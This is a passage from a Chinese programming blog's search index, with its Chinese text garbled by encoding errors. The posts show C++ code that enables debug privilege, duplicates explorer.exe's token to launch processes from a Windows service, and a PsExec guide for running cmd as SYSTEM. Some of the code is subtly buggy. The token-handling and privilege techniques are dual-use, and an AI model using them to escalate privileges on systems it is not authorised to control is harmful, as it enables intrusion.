tp.PrivilegeCount = 1; // åªå¯åŠ¨è°ƒè¯•æƒé™ï¼Œæ‰€ä»¥æƒé™çš„ä¸ªæ•°æ˜¯ä¸€ä¸ª tp.Privileges[0].Luid = uID; //å½“Attributes = SE_PRIVILEGE_ENABLEæ—¶ï¼Œæ¿€æ´»æƒé™ //å½“Attributes = 0æ—¶ï¼Œå…³é—­æƒé™ tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // AdjustTokenPrivilegeså‡½æ•°æ¿€æ´»æˆ–è€…å…³é—­tpä¸­ç»™å®šçš„æƒé™ if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL)) &#123; CloseHandle(hToken); return FALSE; &#125; // å…³é—­è®¿é—®ä»¤ç‰Œå¥æŸ„ CloseHandle(hToken); return TRUE; &#125; return FALSE;&#125; è®¾ç½®å½“å‰è¿›ç¨‹çš„ä¼šè¯ä¿¡æ¯ï¼š 1234567891011121314151617181920212223242526272829bool CreateProcessAsSystemBySession(LPCTSTR pszAppName, LPCTSTR pszCmd, LPCTSTR pszCwd, DWORD dwSession, HANDLE hEnvToken)&#123; if (pszCmd == NULL) return false; bool bRet = false; HANDLE hTokenThis = NULL; bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &amp;hTokenThis); if (!bRet || hTokenThis == NULL) return false; HANDLE hTokenDup = NULL; bRet = DuplicateTokenEx(hTokenThis, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &amp;hTokenDup); CloseHandle(hTokenThis); if (!bRet || hTokenDup == NULL) return false; if (!SetTokenInformation(hTokenDup, TokenSessionId, &amp;dwSession, sizeof(DWORD))) &#123; CloseHandle(hTokenDup); return false; &#125; bRet = CreateProcessByToken(hTokenDup, hEnvToken, pszAppName, pszCmd, pszCwd, TRUE); CloseHandle(hTokenDup); return bRet;&#125; è°ƒç”¨æ¥å£åˆ›å»ºè¿›ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566typedef BOOL(STDMETHODCALLTYPE FAR* LPFNCREATEENVIRONMENTBLOCK) (LPVOID* lpEnvironment, HANDLE hToken, BOOL bInherit);typedef BOOL(STDMETHODCALLTYPE FAR* LPFNDESTROYENVIRONMENTBLOCK) (LPVOID lpEnvironment);bool CreateProcessByToken(HANDLE hToken, HANDLE hEnvToken, LPCTSTR pszAppName, LPCTSTR pszCmd, LPCTSTR pszCwd, BOOL bWndHide/* = FALSE*/)&#123; STARTUPINFO si = &#123; sizeof(si) &#125;; PROCESS_INFORMATION pi = &#123; 0 &#125;; si.lpDesktop = (LPWSTR)L&quot;Winsta0\\\\Default&quot;; if (bWndHide) &#123; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; &#125; DWORD dwCreationFlag = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE; LPVOID pEnvironment = NULL; LPFNCREATEENVIRONMENTBLOCK lpfnCreateEnvironmentBlock = NULL; LPFNDESTROYENVIRONMENTBLOCK lpfnDestroyEnvironmentBlock = NULL; HMODULE hUserEnvLib = NULL; hUserEnvLib = LoadLibrary(L&quot;userenv.dll&quot;); if (NULL != hUserEnvLib) &#123; lpfnCreateEnvironmentBlock = (LPFNCREATEENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, &quot;CreateEnvironmentBlock&quot;); lpfnDestroyEnvironmentBlock = (LPFNDESTROYENVIRONMENTBLOCK)GetProcAddress(hUserEnvLib, &quot;DestroyEnvironmentBlock&quot;); &#125; if (NULL != lpfnCreateEnvironmentBlock) &#123; if (lpfnCreateEnvironmentBlock(&amp;pEnvironment, hEnvToken, FALSE)) &#123; dwCreationFlag |= CREATE_UNICODE_ENVIRONMENT; // must specify &#125; else pEnvironment = NULL; &#125; bool bRet = false; BOOL bDisableRedirect = FALSE; if (CreateProcessAsUser(hToken, pszAppName, (LPTSTR)pszCmd, NULL, NULL, FALSE, dwCreationFlag, pEnvironment, pszCwd, &amp;si, &amp;pi)) &#123; CloseHandle(pi.hThread); DWORD dwRet = WaitForSingleObject(pi.hProcess, 2 * 60 * 60 * 1000); if (WAIT_TIMEOUT == dwRet) &#123; &#125; else if (WAIT_OBJECT_0 == dwRet) &#123; bRet = true; &#125; CloseHandle(pi.hProcess); &#125; if (NULL != lpfnDestroyEnvironmentBlock) lpfnDestroyEnvironmentBlock(pEnvironment); if (NULL != hUserEnvLib) FreeLibrary(hUserEnvLib); return bRet;&#125;","tags":[{"name":"Windows/æƒé™","slug":"Windows-æƒé™","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9D%83%E9%99%90/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://hodlyounger.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"é™æƒ","slug":"é™æƒ","permalink":"https://hodlyounger.github.io/tags/%E9%99%8D%E6%9D%83/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€Windowsã€‘æœåŠ¡ä¸­ä»¥ç®¡ç†å‘˜\\æ™®é€šæƒé™å¯åŠ¨è¿›ç¨‹","date":"2023-10-27T01:24:02.062Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘ Serviceé™æƒå¯åŠ¨è¿›ç¨‹/","text":"æ¦‚è¿°ï¼šwindows æœåŠ¡ä¸­ä»¥ç®¡ç†å‘˜æˆ–æ™®é€šæƒé™å¯åŠ¨è¿›ç¨‹ 0x01 ç®¡ç†å‘˜æƒé™å¯åŠ¨è¿›ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// ç®¡ç†å‘˜æƒé™å¯åŠ¨è¿›ç¨‹#ifdef UNICODEMMSYSSHARED_EXPORT bool CreateProcessWithAdmin(const std::wstring&amp; exe, const std::wstring&amp; param, bool show)#elseMMSYSSHARED_EXPORT bool CreateProcessWithAdmin(const std::string&amp; exe, const std::string&amp; param, bool show)#endif // UNICODE&#123; HANDLE hToken&#123; NULL &#125;; HANDLE hTokenDup&#123; NULL &#125;; LPVOID pEnvironment&#123; NULL &#125;; bool res&#123; false &#125;;#ifdef UNICODE wchar_t* cmd = (wchar_t*)param.c_str();#else char* cmd = (wchar_t*)param.c_str();#endif do &#123; if (exe.empty()) &#123; LOG_ERROR(&quot;exe is null!&quot;); break; &#125; if (!GetTokenWithProcessName(L&quot;explorer.exe&quot;, hToken)) &#123; LOG_ERROR(&quot;GetTokenWithProcessName Error: %u&quot;, GetLastError()); break; &#125; // å¤åˆ¶ä»¤ç‰Œ,æŠŠè°ƒç”¨æ–¹æœ‰æ•ˆçš„æ‰€æœ‰è®¿é—®æƒé™ç»™å¤åˆ¶åçš„ä»¤ç‰Œ. if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED/*TOKEN_ALL_ACCESS*/, NULL/*&amp;sa*/, SecurityImpersonation, TokenPrimary, &amp;hTokenDup)) &#123; LOG_ERROR(&quot;DuplicateTokenEx Error: %u&quot;, GetLastError()); break; &#125; STARTUPINFO si; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO);#ifdef UNICODE wchar_t desk[]&#123; TEXT(&quot;WinSta0\\\\Default&quot;) &#125;;#else char desk[]&#123; TEXT(&quot;WinSta0\\\\Default&quot;) &#125;;#endif si.lpDesktop = desk; if (show) &#123; si.wShowWindow = SW_SHOW; &#125; else &#123; si.wShowWindow = SW_HIDE; &#125; si.dwFlags = STARTF_USESHOWWINDOW; PROCESS_INFORMATION pi; // æ£€ç´¢æŒ‡å®šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œå¯ä»¥å°†æ­¤å—ä¼ é€’ç»™ CreateProcessAsUser å‡½æ•°ã€‚ if (!CreateEnvironmentBlock(&amp;pEnvironment, hTokenDup, FALSE)) &#123; LOG_ERROR(&quot;CreateEnvironmentBlock Error: %u&quot;, GetLastError()); break; &#125; // ç¼ºå°‘ç¯å¢ƒå˜é‡æ—¶æŸäº›ä¾èµ–ç¯å¢ƒå˜é‡çš„ç¨‹åºæ‰“ä¸å¼€ï¼Œæˆ–è€…è¿è¡Œä¸æ­£å¸¸ã€‚ if (!CreateProcessAsUser(hTokenDup, exe.c_str(), cmd, NULL, NULL, FALSE , NORMAL_PRIORITY_CLASS /*| CREATE_NEW_CONSOLE */ | CREATE_UNICODE_ENVIRONMENT , pEnvironment, NULL, &amp;si, &amp;pi)) &#123; LOG_ERROR(&quot;CreateProcessAsUser Error: %u&quot;, GetLastError()); break; &#125; res = true; &#125; while (0); // æ¸…ç† if (cmd) &#123; delete[]cmd; &#125; if (pEnvironment) &#123; DestroyEnvironmentBlock(pEnvironment); &#125; if(hToken) CloseHandle(hToken); if (hTokenDup) CloseHandle(hTokenDup); return res;&#125; 0x02 æ™®é€šç”¨æˆ·æƒé™å¯åŠ¨è¿›ç¨‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// æ™®é€šç”¨æˆ·æƒé™å¯åŠ¨è¿›ç¨‹#ifdef UNICODEbool CreateProcessWithUser(const std::wstring&amp; exePath, const std::wstring&amp; param, bool show)#elsebool CreateProcessWithUser(const std::string&amp; exePath, const std::string&amp; param, bool show)#endif // UNICODE&#123; HANDLE hToken = 0; HANDLE hNewToken = 0; LPVOID pEnvironment&#123; NULL &#125;; bool res&#123; false &#125;; int l = param.length();#ifdef UNICODE wchar_t* cmd = new wchar_t[l + 1]; memcpy(cmd, param.c_str(), l * sizeof(wchar_t)); cmd[l] = 0;#else char* cmd = new char[l + 1]; memcpy(cmd, param.c_str(), l * sizeof(char)); cmd[l] = 0;#endif // UNICODE do &#123; if (!GetTokenWithProcessName(L&quot;explorer.exe&quot;, hToken)) &#123; LOG_ERROR(&quot;GetTokenWithProcessName Error: %u&quot;, GetLastError()); break; &#125; if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL/*&amp;sa*/, SECURITY_MAX_IMPERSONATION_LEVEL, TokenPrimary, &amp;hNewToken)) &#123; LOG_ERROR(&quot;DuplicateTokenEx Error: %u&quot;, GetLastError()); break; &#125; DWORD dwCreationFlag = NORMAL_PRIORITY_CLASS /*| CREATE_NEW_CONSOLE*/ | CREATE_UNICODE_ENVIRONMENT; // æ£€ç´¢æŒ‡å®šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œå¯ä»¥å°†æ­¤å—ä¼ é€’ç»™ CreateProcessAsUser å‡½æ•°ã€‚ if (!CreateEnvironmentBlock(&amp;pEnvironment, hNewToken, FALSE)) &#123; LOG_ERROR(&quot;CreateEnvironmentBlock Error: %u&quot;, GetLastError()); break; &#125; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(STARTUPINFO)); si.cb = sizeof(STARTUPINFO);#ifdef UNICODE wchar_t desktop[] = L&quot;winsta0\\\\default&quot;;#else char desktop[] = &quot;winsta0\\\\default&quot;;#endif si.lpDesktop = desktop; si.dwFlags = STARTF_USESHOWWINDOW; if (show) &#123; si.wShowWindow = SW_SHOW; &#125; else &#123; si.wShowWindow = SW_HIDE; &#125; if (!CreateProcessAsUser(hNewToken, exePath.c_str(), cmd, 0, 0, FALSE, dwCreationFlag, pEnvironment, 0, &amp;si, &amp;pi)) &#123;#ifdef UNICODE std::string ansicmd = mm::Charset::UnicodeToANSI(cmd); std::string ansibat = mm::Charset::UnicodeToANSI(exePath.c_str()); LOG_ERROR(&quot;CreateProcessAsUser error! LastError=%ld, %s, %s&quot;, GetLastError(), ansibat.c_str(), ansicmd.c_str());#else LOG_ERROR(&quot;CreateProcessAsUser error! LastError=%ld, %s, %s&quot;, GetLastError(), exePath.c_str(), cmd.c_str());#endif // UNICODE break; &#125; res = true; &#125; while (0); // æ¸…ç† delete[] cmd; if (hToken) &#123; CloseHandle(hToken); &#125; if (hNewToken) &#123; CloseHandle(hNewToken); &#125; if (pEnvironment) &#123; DestroyEnvironmentBlock(pEnvironment); &#125; return res;&#125; 0x03 æ ¹æ®è¿›ç¨‹åè·å–è¿›ç¨‹å¥æŸ„ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#ifdef UNICODE bool GetTokenWithProcessName(const wchar_t* szName, HANDLE&amp; hToken)#else bool GetTokenWithProcessName(const char* szName, HANDLE&amp; hToken)#endif // _DEBUG &#123; // HANDLE hToken&#123; NULL &#125;; HANDLE hProcessSnap&#123; NULL &#125;; PROCESSENTRY32 pe32&#123; NULL &#125;; HANDLE hProcess&#123; NULL &#125;; bool res&#123; false &#125;; do &#123; // å¤šç”¨æˆ·æ¨¡å¼æ—¶ä»»åŠ¡ç®¡ç†å™¨é‡Œå¯èƒ½å‡ºç°å¤šä¸ªexplorer // éœ€è¦å…ˆè·å–å½“å‰ä¼šè¯IDï¼Œå†é€šè¿‡æšä¸¾è¿›ç¨‹ï¼Œé€šè¿‡æ¯”è¾ƒsessionIDè¿›è€Œå¾—åˆ°tokenã€‚ //DWORD dwSessionId = WTSGetActiveConsoleSessionId(); //PWTS_PROCESS_INFO ppi = NULL; //DWORD dwProcessCount = 0; //if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &amp;ppi, &amp;dwProcessCount)) //&#123; // for (int i = 0; i &lt; dwProcessCount; i++) // &#123; // if (_wcsicmp(ppi[i].pProcessName, L&quot;explorer.exe&quot;) == 0) // &#123; // if (ppi[i].SessionId == dwSessionId) // &#123; // break; // &#125; // &#125; // &#125; // WTSFreeMemory(ppi); //&#125; hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (!hProcessSnap) &#123; LOG_ERROR(&quot;CreateToolhelp32Snapshot error! %d&quot;, GetLastError()); break; &#125; pe32.dwSize = sizeof(PROCESSENTRY32); for (Process32First(hProcessSnap, &amp;pe32); Process32Next(hProcessSnap, &amp;pe32);) &#123;#ifdef UNICODE if (_wcsicmp((pe32.szExeFile), szName))#else if (_stricmp((pe32.szExeFile), szName))#endif // _DEBUG continue; hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID); if (!hProcess) &#123; LOG_ERROR(&quot;OpenProcess error! %d&quot;, GetLastError()); break; &#125; BOOL ret = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &amp;hToken); if(!ret) &#123; LOG_ERROR(&quot;OpenProcess error! %d&quot;, GetLastError()); break; &#125; res = true; break; &#125; &#125; while (0); if (hProcessSnap) &#123; CloseHandle(hProcessSnap); &#125; if (hProcess) &#123; CloseHandle(hProcess); &#125; return res; &#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"Windows/æƒé™","slug":"Windows-æƒé™","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9D%83%E9%99%90/"},{"name":"ä¼šè¯","slug":"ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E4%BC%9A%E8%AF%9D/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘ææƒ","date":"2023-10-27T01:24:02.061Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘ææƒ/","text":"è¿™ç¯‡æ–‡ç« ä¼šç»™ä½ å¸¦æ¥ï¼Ÿ ç›´æ¥ Copy å°±å¯ä»¥ä½¿ç”¨çš„ææƒä»£ç ä»¥åŠå¦‚ä½•ä½¿ç”¨ ææƒ ç›¸å…³å¤´æ–‡ä»¶ 12#include &lt;windows.h&gt; #include &lt;tlhelp32.h&gt; ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172BOOL EnablePrivilege(LPCTSTR lpszPrivilegeName, BOOL bEnable)&#123; int nResult = FALSE; int nRetCode = FALSE; HANDLE hToken = NULL; TOKEN_PRIVILEGES tkp = &#123; 0 &#125;; do &#123; nRetCode = ::OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken); if (!nRetCode) break; nRetCode = ::LookupPrivilegeValue(NULL, lpszPrivilegeName, &amp;tkp.Privileges[0].Luid); if (!nRetCode) break; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0; nRetCode = ::AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL); if (!nRetCode) break; nResult = TRUE; &#125; while (FALSE); if (hToken != NULL) &#123; CloseHandle(hToken); &#125; return nResult;&#125;HANDLE GetExplorerToken()&#123; EnablePrivilege(SE_DEBUG_NAME, TRUE); HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapshot == INVALID_HANDLE_VALUE) &#123; return NULL; &#125; HANDLE hExplorerToken = NULL; PROCESSENTRY32 pe = &#123; 0 &#125;; pe.dwSize = sizeof(pe); BOOL bMore = ::Process32First(hSnapshot, &amp;pe); while (bMore) &#123; if (_tcsicmp(&quot;explorer.exe&quot;, pe.szExeFile) == 0) &#123; HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID); if (hProcess == NULL) &#123; continue; &#125; if (OpenProcessToken(hProcess, TOKEN_QUERY, &amp;hExplorerToken)) &#123; CloseHandle(hProcess); break; &#125; CloseHandle(hProcess); &#125; bMore = ::Process32Next(hSnapshot, &amp;pe); &#125; CloseHandle(hSnapshot); return hExplorerToken;&#125; ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹è¾¹è¿™æ®µä»£ç  12345678910111213141516BOOL EnableDebugPrivilege() &#123; HANDLE hToken; BOOL fOk = FALSE; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); &#125; return fOk;&#125; å°†æƒé™è®¾ç½®ä¸ºå…¥å‚å½¢å¼ï¼š 123456789101112131415161718192021222324252627282930313233343536BOOL EnableXXXPrivilege(LPCTSTR pszPrivilegeName)&#123; HANDLE hToken; LUID seXXXNameValue; TOKEN_PRIVILEGES tkp; // enable the SeXXXPrivilege if ( ! OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) &#123; MYTRACE(L&quot;OpenProcessToken() failed, Error = %d %s is not available.\\n&quot; , GetLastError(), pszPrivilegeName ); return FALSE; &#125; if ( !LookupPrivilegeValue( NULL, pszPrivilegeName, &amp;seXXXNameValue)) &#123; MYTRACE(L&quot;LookupPrivilegeValue() failed, Error = %d %s is not available.\\n&quot;, GetLastError(), pszPrivilegeName); CloseHandle( hToken ); return FALSE; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = seXXXNameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if ( !AdjustTokenPrivileges( hToken, FALSE, &amp;tkp, sizeof tkp, NULL, NULL )) &#123; MYTRACE(L&quot;AdjustTokenPrivileges() failed, Error = %d %s is not available.\\n&quot;, GetLastError(),pszPrivilegeName); CloseHandle( hToken ); return FALSE; &#125; CloseHandle( hToken ); return TRUE;&#125; ä½¿ç”¨ 1234567891011HANDLE hExplorerToken = GetExplorerToken();if (hExplorerToken == NULL) break;char szUserProfilePath[MAX_PATH] = &#123; 0 &#125;;DWORD cchSize = MAX_PATH;if (!GetUserProfileDirectoryA(hExplorerToken, szUserProfilePath, &amp;cchSize))&#123; CloseHandle(hExplorerToken); break;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://hodlyounger.github.io/tags/%E6%8F%90%E6%9D%83/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘ææƒå·¥å…· psExec.exe","date":"2023-10-27T01:24:02.061Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘ææƒå·¥å…·/","text":"æ¦‚è¿°ï¼špsexec ç”¨æ³• ä½¿ç”¨æ–¹æ³•ï¼š 1psexec -i -d -s cmd.exe # å°±æ˜¯ææƒè¿è¡Œcmd å‚æ•° è¯´æ˜ -a ä½¿ç”¨é€—å·åˆ†éš”åº”ç”¨ç¨‹åºå¯ä»¥åœ¨ä¸Šé¢è¿è¡Œçš„å¤„ç†å™¨ï¼Œå…¶ä¸­ 1 æ˜¯ç¼–å·æœ€ä½çš„ CPUã€‚ ä¾‹å¦‚ï¼Œè‹¥è¦åœ¨ CPU 2 å’Œ CPU 4 ä¸Šè¿è¡Œåº”ç”¨ç¨‹åºï¼Œè¯·è¾“å…¥ï¼šâ€œ-a 2,4â€ -c å°†æŒ‡å®šçš„å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°è¿œç¨‹ç³»ç»Ÿä»¥æ‰§è¡Œã€‚ å¦‚æœçœç•¥æ­¤é€‰é¡¹ï¼Œåˆ™åº”ç”¨ç¨‹åºå¿…é¡»ä½äºè¿œç¨‹ç³»ç»Ÿä¸Šçš„ç³»ç»Ÿè·¯å¾„ä¸­ã€‚ -d ä¸è¦ç­‰å¾…è¿›ç¨‹ç»ˆæ­¢ï¼ˆéäº¤äº’å¼ï¼‰ã€‚ -e ä¸è¦åŠ è½½æŒ‡å®šå¸æˆ·çš„é…ç½®æ–‡ä»¶ã€‚ -f å¤åˆ¶æŒ‡å®šçš„ç¨‹åºï¼Œå³ä½¿æ–‡ä»¶å·²å­˜åœ¨äºè¿œç¨‹ç³»ç»Ÿä¸Šã€‚ -i è¿è¡Œç¨‹åºï¼Œä½¿å…¶ä¸è¿œç¨‹ç³»ç»Ÿä¸ŠæŒ‡å®šä¼šè¯çš„æ¡Œé¢è¿›è¡Œäº¤äº’ã€‚ å¦‚æœæœªæŒ‡å®šä¼šè¯ï¼Œåˆ™è¿›ç¨‹åœ¨æ§åˆ¶å°ä¼šè¯ä¸­è¿è¡Œã€‚ å½“å°è¯•ä»¥äº¤äº’æ–¹å¼è¿è¡Œæ§åˆ¶å°åº”ç”¨ç¨‹åºï¼ˆä½¿ç”¨é‡å®šå‘çš„æ ‡å‡† IOï¼‰æ—¶ï¼Œéœ€è¦æ­¤æ ‡å¿—ã€‚ -h å¦‚æœç›®æ ‡ç³»ç»Ÿä¸º Vista æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œåˆ™ä½¿ç”¨å¸æˆ·çš„æå‡ä»¤ç‰Œï¼ˆå¦‚æœå¯ç”¨ï¼‰è¿è¡Œè¿›ç¨‹ã€‚ -l ä»¥å—é™ç”¨æˆ·èº«ä»½è¿è¡Œè¿›ç¨‹ï¼ˆåˆ é™¤ Administrators ç»„ï¼Œå¹¶ä»…å…è®¸åˆ†é…ç»™ Users ç»„çš„æƒé™ï¼‰ã€‚ åœ¨ Windows Vista ä¸Šï¼Œè¿›ç¨‹ä»¥ä½å®Œæ•´æ€§è¿è¡Œã€‚ -n æŒ‡å®šè¿æ¥åˆ°è¿œç¨‹è®¡ç®—æœºçš„è¶…æ—¶æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚ -p æŒ‡å®šç”¨æˆ·åçš„å¯é€‰å¯†ç ã€‚ å¦‚æœçœç•¥æ­¤å†…å®¹ï¼Œç³»ç»Ÿå°†æç¤ºä½ è¾“å…¥éšè—å¯†ç ã€‚ -r æŒ‡å®šè¦åˆ›å»ºæˆ–ä¸ä¹‹äº¤äº’çš„è¿œç¨‹æœåŠ¡çš„åç§°ã€‚ -s åœ¨ç³»ç»Ÿå¸æˆ·ä¸­è¿è¡Œè¿œç¨‹è¿›ç¨‹ã€‚ -u æŒ‡å®šç™»å½•è¿œç¨‹è®¡ç®—æœºçš„å¯é€‰ç”¨æˆ·åã€‚ -v ä»…å½“æŒ‡å®šæ–‡ä»¶çš„ç‰ˆæœ¬å·è¾ƒé«˜æˆ–æ¯”è¿œç¨‹ç³»ç»Ÿä¸Šçš„ç‰ˆæœ¬å·æ–°æ—¶ï¼Œæ‰å¤åˆ¶æŒ‡å®šæ–‡ä»¶ã€‚ -w è®¾ç½®è¿›ç¨‹çš„å·¥ä½œç›®å½•ï¼ˆç›¸å¯¹äºè¿œç¨‹è®¡ç®—æœºï¼‰ã€‚ -x åœ¨ Winlogon å®‰å…¨æ¡Œé¢ä¸Šæ˜¾ç¤º UIï¼ˆä»…é™æœ¬åœ°ç³»ç»Ÿï¼‰ã€‚ -priority æŒ‡å®š -lowã€-belownormalã€-abovenormalã€-high æˆ– -realtimeï¼Œä»¥ä¾¿ä»¥ä¸åŒçš„ä¼˜å…ˆçº§è¿è¡Œè¿›ç¨‹ã€‚ ä½¿ç”¨ -background åœ¨ Vista ä¸Šä»¥ä½å†…å­˜å’Œ I/O ä¼˜å…ˆçº§è¿è¡Œã€‚ computer æŒ‡ç¤º PsExec åœ¨æŒ‡å®šçš„è¿œç¨‹è®¡ç®—æœºä¸Šè¿è¡Œåº”ç”¨ç¨‹åºã€‚ å¦‚æœçœç•¥è®¡ç®—æœºåç§°ï¼ŒPsExec å°†åœ¨æœ¬åœ°ç³»ç»Ÿä¸Šè¿è¡Œåº”ç”¨ç¨‹åºï¼Œå¦‚æœæŒ‡å®šé€šé…ç¬¦ (\\*)ï¼ŒPsExec å°†åœ¨å½“å‰åŸŸä¸­çš„æ‰€æœ‰è®¡ç®—æœºä¸Šè¿è¡Œå‘½ä»¤ã€‚ @file PsExec å°†åœ¨æ–‡ä»¶ä¸­åˆ—å‡ºçš„æ¯å°è®¡ç®—æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ cmd è¦æ‰§è¡Œçš„åº”ç”¨ç¨‹åºçš„åç§°ã€‚ arguments è¦ä¼ é€’çš„å‚æ•°ï¼ˆè¯·æ³¨æ„ï¼Œæ–‡ä»¶è·¯å¾„å¿…é¡»æ˜¯ç›®æ ‡ç³»ç»Ÿä¸Šçš„ç»å¯¹è·¯å¾„ï¼‰ã€‚ -accepteula æ­¤æ ‡å¿—ç¦æ­¢æ˜¾ç¤ºè®¸å¯è¯å¯¹è¯æ¡†ã€‚ -nobanner æ­¤æ ‡å¿—ä¼šæ¶ˆé™¤å¯åŠ¨æ¨ªå¹…å’Œç‰ˆæƒæ¶ˆæ¯ã€‚","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://hodlyounger.github.io/tags/%E6%8F%90%E6%9D%83/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€Windowsã€‘æƒé™(Privilege Constants)","date":"2023-10-27T01:24:02.060Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ã€‘Privilege's constants/","text":"é˜…è¯»è¿™ç¯‡æ–‡ç« ä½ å¯ä»¥äº†è§£ï¼š Constants æ˜¯ä»€ä¹ˆ windows ææƒæ—¶å¸¸ç”¨çš„ Constants å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼šPrivilege Constants (Winnt.h) - Win32 apps | Microsoft Learn 0x01 ä»‹ç» Constants Constants 